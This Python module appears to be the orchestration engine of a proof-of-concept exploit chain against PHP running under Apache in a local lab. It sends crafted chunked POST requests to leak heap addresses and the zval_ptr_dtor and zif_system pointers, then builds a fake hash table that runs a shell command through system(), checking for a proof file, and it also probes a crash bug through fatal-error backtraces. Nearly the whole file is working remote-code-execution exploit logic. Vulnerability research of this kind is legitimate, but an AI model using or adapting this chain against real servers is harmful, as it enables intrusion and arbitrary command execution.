"""Exploit chain orchestration and result classification."""
from __future__ import annotations

import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path

from . import leak as leakmod
from . import payload, wire
from .lab import Lab

QUERY = payload.QUERY


class EngineError(RuntimeError):
    pass


@dataclass(frozen=True)
class Offsets:
    dtor: int
    zif: int
    s_offset: int = leakmod.S_OFFSET
    main_count: int = leakmod.MAIN_BUCKET_COUNT

    @classmethod
    def from_dict(cls, values: dict[str, int], **kwargs) -> "Offsets":
        return cls(dtor=values["zval_ptr_dtor"], zif=values["zif_system"], **kwargs)


@dataclass
class RceOutcome:
    status: str
    proof: str | None = None
    leak: leakmod.Leak | None = None
    attempts: int = 0
    detail: str = ""
    logs: list[str] = field(default_factory=list)

    @property
    def vulnerable(self) -> bool:
        return self.status in ("VULNERABLE_RCE", "VULNERABLE_LEAK")


class Engine:
    def __init__(self, lab: Lab, offsets: Offsets, evidence_dir: Path,
                 proof_name: str | None = None, command: str | None = None,
                 retries: int = 3, a1_timeout: float = 180.0,
                 b1_timeout: float = 300.0, a2_timeout: float = 180.0,
                 b2_timeout: float = 120.0, proof_wait: float = 6.0):
        self.lab = lab
        self.offsets = offsets
        self.evidence_dir = Path(evidence_dir)
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        self.proof_name = proof_name or ("proof-%s-%s" % (lab.role, uuid.uuid4().hex[:12]))
        self.command = command or ("id > /out/%s" % self.proof_name)
        self.retries = retries
        self.a1_timeout = a1_timeout
        self.b1_timeout = b1_timeout
        self.a2_timeout = a2_timeout
        self.b2_timeout = b2_timeout
        self.proof_wait = proof_wait
        self.logs: list[str] = []
        self.a1 = payload.build_a1()
        self.b1 = payload.build_b1()
        self.a2 = payload.build_a2()

    def log(self, message: str) -> None:
        self.logs.append(message)

    @property
    def proof_path(self) -> Path:
        return self.lab.out_dir / self.proof_name

    def _save(self, name: str, response: wire.HttpResponse) -> None:
        (self.evidence_dir / name).write_bytes(response.raw)

    def _a1(self) -> wire.HttpResponse:
        response = wire.post_chunked("127.0.0.1", self.lab.port, "/index.php" + QUERY,
                                     self.a1, timeout=self.a1_timeout)
        self._save("a1.resp", response)
        return response

    def _b1(self) -> wire.HttpResponse:
        response = wire.post_chunked("127.0.0.1", self.lab.port, "/index.php",
                                     self.b1, timeout=self.b1_timeout)
        self._save("b1.resp", response)
        return response

    def _parse(self, response: wire.HttpResponse) -> leakmod.Leak:
        return leakmod.parse_leak(response.raw, self.offsets.dtor, self.offsets.zif,
                                  main_bucket_count=self.offsets.main_count,
                                  s_offset=self.offsets.s_offset)

    def probe_leak(self) -> leakmod.Leak:
        last_error = "not attempted"
        for attempt in range(1, self.retries + 1):
            self.log("leak attempt %d/%d: A1" % (attempt, self.retries))
            a1 = self._a1()
            self.log("A1 status=%s bytes=%d" % (a1.status, len(a1.raw)))
            if a1.status not in (500, None):
                last_error = "A1 returned HTTP %s" % a1.status
                continue
            time.sleep(0.25)
            self.log("leak attempt %d/%d: B1" % (attempt, self.retries))
            b1 = self._b1()
            self.log("B1 status=%s bytes=%d" % (b1.status, len(b1.raw)))
            try:
                found = self._parse(b1)
            except leakmod.LeakError as exc:
                last_error = str(exc)
                self.log("leak parse failed: %s" % exc)
                continue
            self.log("leak: %s" % found.summary())
            return found
        raise EngineError("no stale-session leak after %d attempts: %s"
                          % (self.retries, last_error))

    def run_rce(self) -> RceOutcome:
        last_error = "not attempted"
        for attempt in range(1, self.retries + 1):
            try:
                self.proof_path.unlink()
            except FileNotFoundError:
                pass
            except OSError:
                self.lab.remove_out_file(self.proof_name)

            self.log("rce attempt %d/%d: A1" % (attempt, self.retries))
            a1 = self._a1()
            self.log("A1 status=%s bytes=%d" % (a1.status, len(a1.raw)))
            if a1.status not in (500, None):
                last_error = "A1 returned HTTP %s" % a1.status
                continue
            time.sleep(0.25)

            self.log("rce attempt %d/%d: B1" % (attempt, self.retries))
            b1 = self._b1()
            self.log("B1 status=%s bytes=%d" % (b1.status, len(b1.raw)))
            try:
                found = self._parse(b1)
            except leakmod.LeakError as exc:
                last_error = str(exc)
                self.log("leak parse failed: %s" % exc)
                continue
            self.log("leak: %s" % found.summary())

            self.log("rce attempt %d/%d: A2" % (attempt, self.retries))
            a2 = wire.post_plain("127.0.0.1", self.lab.port, "/index.php",
                                 self.a2, timeout=self.a2_timeout)
            self._save("a2.resp", a2)
            self.log("A2 status=%s bytes=%d" % (a2.status, len(a2.raw)))
            time.sleep(0.25)

            self.log("rce attempt %d/%d: B2" % (attempt, self.retries))
            ht = payload.build_ht(found.s_addr, found.zif_system,
                                  self.command.encode())
            b2_body = payload.build_b2(found.s_addr, ht)
            b2 = wire.post_plain("127.0.0.1", self.lab.port, "/index.php",
                                 b2_body, timeout=self.b2_timeout)
            self._save("b2.resp", b2)
            self.log("B2 status=%s bytes=%d" % (b2.status, len(b2.raw)))

            deadline = time.monotonic() + self.proof_wait
            while time.monotonic() < deadline:
                if self.proof_path.exists():
                    proof = self.proof_path.read_text(errors="replace").strip()
                    (self.evidence_dir / "proof.txt").write_text(proof)
                    self.log("RCE proof: %r" % proof)
                    return RceOutcome(status="VULNERABLE_RCE", proof=proof,
                                      leak=found, attempts=attempt,
                                      detail="code execution confirmed",
                                      logs=self.logs)
                time.sleep(0.25)
            last_error = "no proof file after B2"
            self.log(last_error)

        return RceOutcome(status="FAILED", attempts=self.retries,
                          detail=last_error, logs=self.logs)


@dataclass
class BacktraceOutcome:
    status: str
    killed: bool = False
    worker_before: list[int] = field(default_factory=list)
    worker_after: list[int] = field(default_factory=list)
    consumer_status: int | None = None
    detail: str = ""
    logs: str = ""


def probe_backtrace(lab: Lab, enable: bool = True, evidence_dir: Path | None = None,
                    producer: str = "/fatal.php?mode=user_error") -> BacktraceOutcome:
    """Fatal-error backtrace producer followed by an early .htaccess diagnostic."""
    if evidence_dir:
        evidence_dir.mkdir(parents=True, exist_ok=True)
    before = lab.worker_pids()
    producer_resp = wire.get("127.0.0.1", lab.port, producer, timeout=30)
    if evidence_dir:
        (evidence_dir / "fatal.resp").write_bytes(producer_resp.raw)
    time.sleep(0.25)
    consumer = wire.get("127.0.0.1", lab.port, "/consumer/index.php", timeout=30)
    if evidence_dir:
        (evidence_dir / "consumer.resp").write_bytes(consumer.raw)
    time.sleep(0.75)
    after = lab.worker_pids()
    logs = lab.logs()
    if evidence_dir:
        (evidence_dir / "apache.log").write_text(logs)

    markers = ("exit signal", "Segmentation fault", "zend_mm_heap corrupted",
               "child pid", "SIGSEGV", "AH00052")
    marker_hit = any(marker in logs for marker in markers)
    killed = bool(before) and before != after
    if killed or marker_hit:
        status = "VULNERABLE_CRASH"
    elif consumer.status == 200 and lab.health():
        status = "NO_CRASH"
    else:
        status = "INCONCLUSIVE"
    return BacktraceOutcome(
        status=status,
        killed=killed or marker_hit,
        worker_before=before,
        worker_after=after,
        consumer_status=consumer.status,
        detail="fatal_backtraces=%s, workers %s -> %s, consumer HTTP %s"
               % (enable, before, after, consumer.status),
        logs=logs,
    )
